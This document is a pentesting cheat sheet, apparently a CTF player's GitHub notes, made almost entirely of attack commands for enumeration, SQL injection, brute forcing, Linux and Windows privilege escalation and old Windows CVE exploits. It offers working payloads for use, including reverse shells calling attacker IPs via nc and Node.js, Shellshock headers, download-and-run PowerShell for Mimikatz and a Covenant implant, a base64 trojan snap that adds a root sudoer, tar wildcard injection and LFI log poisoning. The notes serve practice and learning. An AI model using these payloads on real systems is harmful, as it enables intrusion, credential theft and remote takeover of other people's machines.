# EzpzCheatSheet
This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before. Also any notes, CTF and others that help me.

Also, do check this notes here [https://github.com/aniqfakhrul/archives](https://github.com/aniqfakhrul/archives) !

# A. Ports

### 25 (SMTP)

```bash
# Nmap

# Enum Users
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10

# Swaks (Send Email)
swaks --to nik@bank.local --from aniq@bank.local --header "Subject: Welcome" --body "Enjoy your stay!" --server 10.10.10.10
```

### 53 (DNS)

```bash
# Install
sudo apt install dnsutils

# Nmap
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" 10.10.10.10

# Nslookup
nslookup 10.10.10.10
	* server 10.10.10.10
	* 10.10.10.10

```

### 88 (Kerberos)

```bash
# Nmap


# Enumerate Users
kerbrute userenum -d bank.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Bruteforce User
kerbrute bruteuser -d bank.local --dc 10.10.10.10 rockyou.txt nik

# Passwword Spray
kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'

# Kerberoasting
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# bloodhound-python
bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.locall' -ns 10.10.10.10
```

### 110,995 (POP3)

```bash
# Nmap

# Banner Grabbing
nc -nv 10.10.10.10 110
openssl s_client -connect 10.10.10.10:995 -crlf -quiet

# Connect
telnet 10.10.10.10 110
	* USER nik
	* PASS Password@123!
	* list
	* retr 1
	* quit
```

### 135,593 (RPC)

```bash
# Nmap

# Rpcclient
rpcclient -U '' -N 10.10.10.10

# Rpcclient Commands
- enumdomusers
- netshareenum
- netshareenumall
- srvinfo
- queryuser 500
- querydispinfo
```

### 139,445 (SMB)

```bash
# Nmap
nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
nmap --script smb-vuln* -p 137,139,445 10.10.10.10

# Smbmap
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u raj -p 123 
smbmap -H 10.10.10.10 -P 139

# Smbclient
smbclient -L 10.10.10.10
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget *"
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget *" 'Password@123!'
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'

# Smbget
smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'

# Crackmapexec
crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 

# Enum4linux
enum4linux 10.10.10.10
```

### 161,162 (SNMP - UDP)

```bash
# Install
pip install snmpclitools

# Snmp-check
snmp-check 10.10.10.10 -c public

# Snmpwalk
snmpwalk -v1 -c public 10.10.10.10
snmpwalk -c public 10.10.10.10
snmpwalk -v1 -c public 10.10.10.10 1
snmpwalk -v1 -c public 10.10.10.10 2
```

### 636 (LDAP)

```bash
# Nmap
nmap -n -sV --script "ldap\* and not brute" 10.10.10.10

# LdapSearch
ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=\*)'
ldapsearch -x -h 10.10.10.10 -D 'bank.local\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'

```

### 1433 (MSSQL)

```code
# Commands
SELECT @@version
SELECT DB_NAME()
SELECT name FROM master..sysdatabases;

```

### 2049 (NFS MOUNT)

```bash
# Showmount
showmount -e 10.10.10.10

# Mount
mount -t nfs 10.10.10.10:/home mnt
mount -o vers=3 -t nfs 10.10.10.10:/home mnt
```

### 3128 (SQUID PROXY)

```bash

# Ffuf
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -x http://10.10.10.10:3128

# proxychains
echo "http 10.10.10.10 3128" >> /etc/proxychains.conf
	* proxychains ssh john@10.10.10.10
```

### 3306 (MYSQL)

```bash
# Commands
mysql -u root -p -h 10.10.10.10
mysql -u root -pPassword123 -e "use drupal;select * from users"

# Bruteforce
hydra -l nik -p password.txt 10.10.10.10 mysql -t 30 -f

# Check UDF
select * from msql.func;

# Mysql Commands
select sys_exec('whoami');
```

### 3389 (RDP)

```bash
# Nmap
nmap -p 3389 --script=rdp-vuln-* 10.10.10.10

# Commands
xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
```

### 3632 (DISTCC)

```bash
# Nmap
nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='id'"

```

### 6379 (REDIS)

```bash
# Install
sudo apt-get install redis-tools

# Commands
redis-cli -h 10.10.10.10
	* keys *
	* get pk:ids:User

```

### 27017,27018 (MONGODB)

```bash
# Commands
mongo localhost:27017/myplace -u nik -p Password123
	* show dbs
	* use <db>
	* show collections
	* db.<collection found>.find()
	* db.<collection found>.insert( { _id: 1, cmd: "curl 10.10.14.4/test"} )
```

# B. Tools/Techniques

### Port Knocking

```bash
# Commands
knocker.py -p 8890,7000,666 10.10.10.10
for i in 571 290 911;do nmap -n -v0 -Pn --max-retries 0 -p $i 10.10.10.10;done
knock 10.10.10.10 7000:666:8890

# Permutation (Port)
python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666\]))' | sed 's/), /\\n/g' | tr -cd '0-9,\\n' | sort | uniq > permutation.txt

```

### SQL Injection

```bash
[MYSQL]
## Get Current Database
database()

## Get Database
UNION SELECT table_schema FROM information_schema.tables

## Get Table Name
UNION SELECT table_name FROM information_schema.tables WHERE table_schema == "database"

## Get Column Name
UNION SELECT table_name, column_name FROM information_schema.columns

###===Time Based===
## Get Database
(SELECT sleep(5) from dual where substring(database(),1,1)='h') 
(SELECT sleep(5) from dual where substring(database(),2,1)='h') 

## Get Tables
(SELECT sleep(5) from information_schema.tables where table_name LIKE '%hotel%')

## Get Columns
(SELECT sleep(5) from information_schema.columns where column_name LIKE '%room%' AND table_name='hotel')

## Extract
IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)

## Extra
(select IF(500>1000, "nothing", sleep(5)))

###===Union Based===
## Get Database
9999 union select 1,database(),3,4,5

## Get Tables
9999 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema like "%hotel%"

## Get Columns
9999 union select 1, group_concat(column_name),3,4,5 from information_schema.columns where table_name like "%room%" 

## Extract
9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user

[ORACLE]
## Get Current Database
union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--

## Get All Tables
' union SELECT table_name,'b',1 FROM all_tables--

## Get Columns
' union SELECT column_name,'b',1 FROM all_tab_columns WHERE table_name = 'TABLE'--

## Extract
' union SELECT USERNAME,'b',1 FROM TABLE--
' union SELECT USERNAME||':'||PASSWORD,'',1 FROM TABLE--
```

### Hydra

```bash
# Install
sudo apt-get install hydra-gtk

# Commands
hydra -l nik -p rockyou.txt 10.10.10.10 ssh -t 30 -f
hydra -L user.txt -P pass.txt 10.10.10.10 ssh -t 30 -f
hydra -L user.txt -P pass.txt 10.10.10.10 ssh -s 2222 -t 30 -f

# Json
hydra -l admin -P rockyou.txt localhost http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
```

### JsonBrute

```bash
# Download
https://github.com/Jake-Ruston/JSONBrute

#Example 1
python3 jsonbrute.py --url http://localhost/v2/login --wordlist rockyou.txt --data "username=user, password=FUZZ" --code 200

#Example 2
python3 jsonbrute.py --url http://localhost/api/login --wordlist rockyou.txt --data "username=admin, password=FUZZ, recaptcha= " --code 200 --verbose
```

### Wfuzz

```bash
#PROXY (-p)
wfuzz -u http://localhost/authenticate -w test.txt -d "uname=admin&psw=FUZZ&remember=on" -p 127.0.0.1:8080 -H "Referer: http://localhost/authenticate"

#COOKIES (-b)
wfuzz -u http://localhost/admin/FUZZ.php -w big.txt -b PHPSESSID=1e28or9cmi6ua05d78tov7j7t4 --hc 404

#POST & output in url (/?login=username_incorrect)
wfuzz -u http://localhost/login -w users.txt -w pass.txt -d "username=FUZZ&password=FUZ2Z"
```

### Ffuf

```bash
# Install

# Commands
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -e .php,.html,.txt,.bak -t 50
ffuf -u 'https://FUZZ.bank.local' -w subdomains-top1million-20000.txt:FUZZ -t 30
ffuf -u 'http://10.10.10.10/' -w sqli.txt:FUZZ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZZ" -fc 200

# POST Method
ffuf -u 'http://10.10.10.10/main/wp-login.php' -w user.txt:USER -w pass.txt:PASS -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=USER&pwd=PASS&wp-submit=Log+In"
ffuf -u 'http://10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z" --fc 200
ffuf -u 'http:/10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z"

# With proxy
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -t 30 -e .php,.html,.txt -x http://10.10.10.10:3128
```

### Uploading Files

```bash
Change content-type
    * text/thml
extension
    * .png.php
    * .php.png
    * .php%00.png
```

### Local File Inclusion (LFI)

```bash
# Wordlists
/var/log/mail.log
/etc/passwd
/etc/ldap.secret
/etc/shadow
/etc/hosts
/etc/knockd.conf

#(1)-----[/var/log/mail.log]-----
nc 10.10.10.10 25

HELO test
MAIL FROM: "test <?php system($_GET['cmd']);?>"
RCPT TO: root
DATA
.
#RCE
/var/log/mail&cmd=ls -la
```

### Remote Command Execution (RCE)

```bash
# Payload Command Execution
'$(nc -e /bin/bash 192.168.149.129 4444)'
"$(printf 'aaa\n/bin/sh\nls')"
() { :;}; /bin/bash
```

### Socat

```bash
socat tcp-listen:8009,fork tcp:192.168.56.104:8009 &
socat tcp-listen:8080,fork tcp:192.168.56.104:8080 &
socat tcp-listen:34483,fork tcp:192.168.56.104:34483 &
socat tcp-listen:4321,fork tcp:192.168.56.104:4321 &
```

### Chisel

```bash
# Chisel
https://github.com/jpillora/chisel

## Client Machine
./chisel client 10.66.67.154:8000 R:25:127.0.0.1:25
./chisel client 10.10.10.10:8001 R:1080:socks

## Attacker Machine
./chisel server -p 8000 --reverse
```

### Ping Sweep

```bash
#!/bin/bash

for i in {1..255}; do 
        if out=$(ping -c 1 10.10.10.$i); then
                echo "$out" | grep ttl | cut -d " " -f4 | cut -d ":" -f1
                echo "$out" | grep ttl | cut -d " " -f4 | cut -d ":" -f1 >> ip.txt
        fi
done
```

### Stegseek

```bash
# Downloads
https://github.com/RickdeJager/stegseek

# Commands
stegseek [stegofile.jpg] [wordlist.txt]
stegeek a.jpg rockyou.txt
```

### Binwalk
```bash
# Download/Install
https://github.com/ReFirmLabs/binwalk
sudo apt-get install -y binwalk

# Commands
binwalk --signature firmware.bin
binwalk -A firmware.bin

# References
- https://github.com/ReFirmLabs/binwalk/wiki/Usage
```

### Crunch

```bash
#options (-t)
=> crunch 5 5 -t @@@@@ -o alphabet.txt
@ will insert lower case characters
, will insert upper case characters
% will insert numbers
^ will insert symbols
```

### Kwprocessor

```bash
# Download
https://github.com/hashcat/kwprocessor

# Commands
./kwp basechar.txt keymap.txt route.txt
./kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route
```

### PrivescCheck.ps1

```bash
# Download
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

# Get File from Victim Machine
wget http://10.10.14.16:80/PrivescCheck.ps1 -outfile PrivescCheck.ps1

# Commands
. .\PrivescCheck.ps1
Invoke-PrivescCheck

# Directly
IEX(IWR http://10.10.10.10/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck
```

### Windows-Exploit-Suggester 

```bash
# Download
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

# Commands
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py -i systeminfo.txt -d 2021-04-23-mssb.xls
```

### WebDav

```bash
# Commands
davtest -url http://10.10.10.15
cadaver http://10.10.10.15/   
	* put shell.txt
	* move shell.txt shell.aspx
```

### Threader3000

```bash
# Install
pip3 install threader3000

# Commands
threader3000

# One Liner
for i in $(cat ip.txt); do echo "["$i"]" >> port.txt; echo "" >> port.txt;echo $i | threader3000 | grep "open" >> port.txt; echo "" >> port.txt;done

# References
- https://github.com/dievus/threader3000
```

### Seatbelt.exe

```bash
# Download
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

# Usage
Seatbelt.exe all
```

### File Transfer

```bash
# SMB
- Create one folder name profile (mkdir profile)
- sudo /opt/Tools/impacket/examples/smbserver.py items profile
- net view \\10.10.10.10
- copy items.db \\10.10.10.10\ITEMS\items.db

# References
https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
```

### Firefox Decrypt

```bash
# Download
https://github.com/unode/firefox_decrypt.git

# Usage
- Ensure that these files in the folder
	* logins.json
	* cookies.sqlite
	* key4.db
	* cert9.db
- python3 firefox_decrypt.py /opt/Training/Gatekeeper/profile
```

### Sshuttle

```bash
# Commands
sshuttle -vr sshuser@10.10.10.10 192.168.0.1/24
sshuttle -vr sshuser@10.10.10.10 192.168.0.1/16
````

### Pwsh

```bash
# Downloads/Install
https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7.1
```

### Invoke-Mimikatz.ps1

```bash
# Downloads
https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1

# Commands
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
Invoke-Mimikatz -DumpCreds
```

### Sharphound.ps1

```code
# Downloads
https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

# Commands
Invoke-Bloodhound -CollectionMethod All -Domain bank.local
Invoke-Bloodhound -CollectionMethod All 

```

### jq

```code
# Install
sudo apt install jq

# Example
cat 20210606133816_users.json | jq '.users[] | .Properties["name"]'

# References
https://lzone.de/cheat-sheet/jq

```

### Linux Commands

```code
# Remove First Character
echo "xtest" | cut -c2-
```

### PowerShell Commands

```powershell
# Show Process
ps
ps | findstr "something"

# Kill Process
stop-process -id 500 -force

# Wget
wget 10.10.10.10/output.txt -outfile output.txt


```

### Bloodhound

```code
# Donwloads/Install
sudo apt-get install bloodhound

# Commands
ne04j console
neo4j

# Notes
http://localhost:7474/
neo4j:neo4j


```


### Rubeus
```bash
# Download
https://github.com/GhostPack/Rubeus

# Commands
.\Rubeus.exe asreproast  /format:hashcat /outfile:ou.txt
.\Rubeus.exe kerberoast /outfile:ou.txt
.\Rubeus dump
	* [IO.File]::WriteAllBytes("C:\users\administrator\downloads\ticket.kirbi", [Convert]::FromBase64String("<base64 longer>"))
	* .\Rubeus.exe ptt /ticket:ticket.kirbi
	* .\PsExec64.exe -accepteula \\bank.local -u nikk cmd 
```

### Covenant

```bash

# Commands
ImpersonateProcess 1776
ImpersonateProcess <PID>
PortScan 192.168.20.10 10-2000

# Chisel
- shell C:\windows\tasks\chisel_windows.exe client 10.10.10.10:8000 R:1080:socks
	* Edit /etc/proxychains4.conf => socks5  127.0.0.1 1080

# Rubeus
- Rubeus kerberoast admin hashcat
- Rubeus klist

# Import Powershell
- PowerShellImport 
- Choose file

# Powerview
- Powershell Get-DomainUser -TrustedToAuth

# PowerMad
- Powershell Resolve-DNSName NoDNSRecord
- Powershell New-ADIDNSNode -Node * -Verbose
- Powershell grant-adidnspermission -node * -principal "Authenticated Users" -Access GenericAll -Verbose

# Invoke-DNSUpdate
- Powershell Invoke-DNSupdate -DNSType A -DNSName * -DNSData 10.10.10.10 -Verbose

# Inveigh
- Powershell Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
- Powershell Invoke-Inveigh -ConsoleOutput Y
- Powershell Stop-Inveigh
- Powwershell Invoke-Inveigh -FileOutput Y

# Load Grunt (Load Assembly)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/grunt.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[GruntStager.GruntStager]::Main("".Split())

# Impersonate 
getsystem

```

### PoshC2	

```code
# Install
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash

# Commands (posh)
posh-project -n <project-name>
posh-project -d <project-name>
posh-config
posh-server <-- This will run the C2 server, which communicates with Implants and receives task output
posh <-- This will run the ImplantHandler, used to issue commands to the server and implants
posh-service <-- This will run the C2 server as a service instead of in the foreground
posh-stop-service <-- This will stop the service
posh-log <-- This will view the C2 log if the server is already running
posh -u aniq

# Commands 


# References
https://github.com/nettitude/PoshC2
https://poshc2.readthedocs.io/en/latest/
https://github.com/zenosxx/PoshC2
```

### Pypykatz

```code
# Intall
pip3 install pypykatz

# Commands
pypykatz lsa minidump lsass.dmp

```

### Crackmapexec

```code
# Docker install
docker pull byt3bl33d3r/crackmapexec
docker run -it --entrypoint=/bin/sh --name crackmapexec byt3bl33d3r/crackmapexec
docker start crackmapexec
docker exec -it crackmapexec sh
```

### Impacket Tools

```bash
# GetNPUsers.py
GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat

# GetUserSPNs.py
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# secretsdump.py
secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10

# wmiexec.py
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10

# smbclient.py
smbclient.py bank.local/nik:'Password@123'@10.10.10.10

# mssqlclient.py
mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10


```

### Objection

```bash
# Install 
pip3 install -U objection 

# Commands 
- objection patchapk --source base.apk 
- objection patchapk --source base.apk -a arm64
- adb install base.objection.apk 
- objection -g com.app.yes explore 
- objection explore (Make sure to open the application first in our mobile phone before run) 

#==Android==
* android sslpinning disable 

#==Ios==
* ios sslpinning disable

# References 
- https://gowthamr1.medium.com/android-ssl-pinning-bypass-using-objection-and-frida-scripts-f8199571e7d8 
- https://github.com/sensepost/objection/tree/master/objection/console/helpfiles
- https://rehex.ninja/posts/frida-cheatsheet/
- https://cheatography.com/hnd/cheat-sheets/objection-ios/
```

### Ysoserial

```bash
# Download
https://github.com/pwntester/ysoserial.net

# Commands
##==Json.Net==
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell curl http://10.10.10.10/"

```

### Python Scripter (Burp)

```bash
# Install
- https://portswigger.net/bappstore/eb563ada801346e6bdb7a7d7c5c52583

# References
- https://gist.github.com/lanmaster53/3d868369d0ba5144b215921d4e11b052
- https://github.com/PortSwigger/python-scripter
```

### CTI Lexicon

```
Link : https://github.com/BushidoUK/CTI-Lexicon/blob/main/Lexicon.md

# About
- Guide to some of the jargon and acronyms liberally used in CTI. You will sometimes find these peppered in reports with no explanation offered or in the Tweets by professionals from Infosec Twitter
```

### Waifu2x (Image Super-Resolution)

```
# References
- https://github.com/nagadomi/waifu2x
- http://waifu2x.udp.jp/
```

### Powerview.ps1

```code
# Commands
Get-DomainComputer
Get-DomainComputer -properties name
Get-DomainTrustMapping -Verbose
Get-DomainTrust
(get-domaincomputer -domain bank.local).dnshostname


# References
https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
```

### PowerUpSQL.ps1

```code
# Commands
Get-SQLInstanceLocal -Verbose
Get-SQLInstanceDomain -Verbose
Get-SQLServerInfo -Verbose -Instance query.bank.local
Invoke-SQLAudit -Verbose -Instance query.bank.local
Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers"

# References
https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
```

# C. SUID/CAP/SUDO/GROUP

### LXD

```bash
#If No Internet Access
1. git clone  https://github.com/saghul/lxd-alpine-builder.git
2. cd lxd-alpine-builder
3. ./build-alpine
4. Upload file.tar.gz into target machine
5. lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
6. lxc init myimage ignite -c security.privileged=true
7. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
8. lxc start ignite
9. lxc exec ignite /bin/sh
```

### Node

```bash
# Sudo
sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### Cat

```bash
# Sudo
sudo /bin/cat /opt/games/../../../etc/passwd
```

### Snap

```bash
# Sudo
# Malicious snap to create dirty_sock:dirty_sock

## python3 snapmal.py
import base64

TROJAN_SNAP = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+ 'A' * 4256 + '==')

blob = base64.b64decode(TROJAN_SNAP)
file = open("sample.snap", "wb")
file.write(blob)
file.close()

# Run
sudo snap install --dangerous --devmode exploit.snap

#another method sudo install
[Sudo snap install]
COMMAND="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.23 443 >/tmp/f"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

# Commands
sudo /usr/bin/snap install test.snap --dangerous --devmode
```

### Msfconsole

```bash
# Sudo
sudo msfconsole -x bash
```

### Docker

```bash
# Group docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Initctl

```bash
# Save as test.conf in /etc/init/testconf
description "Test node.js server"
author      "root"

script
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /tmp/reverse.js
end script

# Nodejs - save as /tmp/reverse.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.14.23", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

# Commands
sudo /sbin/initctl stop test
sudo /sbin/initctl start test
```

### WildCard (*)

```bash
#===Chown/Chmod===
- Imagine there is a cronjob 
	* chown user1:user2 /opt/*
- touch -- --reference=reference
- ln -s /etc/shadow /opt/shadow
- ln -d -s /root /opt/root

## References
- https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/

#===Tar===
- Imagine there is cronjob
	* cd /opt;tar cf /opt/backup.tar *
- touch -- "--checkpoint=1"
- touch -- "--checkpoint-action=exec=sh shell.sh"
- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f" > shell.sh
- chmod 777 ./"--checkpoint=1"
- chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
- chmod 777 shell.sh

#===Parameter===
- Imagine there is wildcard in binary with --help
	* sudo cat * --help
- sudo cat /etc/paswd -help
- Try to look if there is any more parameter that can run so that it will run that before --help
 
## References
- https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/

```


# D. Exploit/CVE/Abuse/Misconf

### ShellShock

```bash
# Payload
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.10/cgi-bin/test.cgi
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOS4xMjMvNDQzIDA+JjE= | base64 -d | bash'" http://10.10.10.10/cgi-bin/admin.cgi

# Refernces
https://github.com/opsxcq/exploit-CVE-2014-6271
```


### MS-17-010

```bash
# Commands
git clone https://github.com/helviojunior/MS17-010.git
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > eternalblue.exe
nc -nlvp 443
python send_and_execute.py 10.10.10.4 /<fullpath>/eternalblue.exe

# Change username if needed for authentication

# References
- https://github.com/helviojunior/MS17-010.git
```

### MS08-067

```bash
# Commands
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows
# Replace the b" -> "
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.4 # Check versio
# Replace the shellcode inside the exploit script
# Ensure the payload total would be 410
# "\x90" * (410 - len(shellcode))

# Run Exploit
# 7 -> Windows XP SP3 English (AlwaysOn NX)
python exploit.py 10.10.10.4 7 445   

# References
- https://www.exploit-db.com/exploits/40279
```

### SeImpersonatePrivilege

```bash
# Tecnique 1
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
PrintSpoofer.exe -i -c cmd

# Technique 2
##First
git clone https://github.com/CCob/SweetPotato.git
run .sln and compile as .exe (Make sure off anti-virus first)
SweetPotato.exe -p cmd.exe

##Second
git clone https://github.com/uknowsec/SweetPotato.git
run .sln and compile as .exe (Make sure off anti-virus first)
SweetPotato.exe -a "whoami"

# Technique 3
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
```

### MS11-046

```bash
# Save it in one file
exploit.c

# Compile
sudo apt-get update
sudo apt-get install mingw-w64
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# Run
exploit.exe

# References
- https://www.exploit-db.com/exploits/40564
```

### MS16-098

```bash
# Download
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe

# Usage
exploit.exe

# References
https://www.exploit-db.com/exploits/41020
```

### MS10-059

```bash
# Download 
wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe

# Usage (Reverse Shell)
exploit.exe 10.10.14.16 9002

# References
```

### Token Kidnapping (Windows 2003)

```bash
# Download
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe

# Usage
churrasco.exe "whoami"

# References
https://www.exploit-db.com/exploits/6705
```

### DirtySock

```bash
# Download
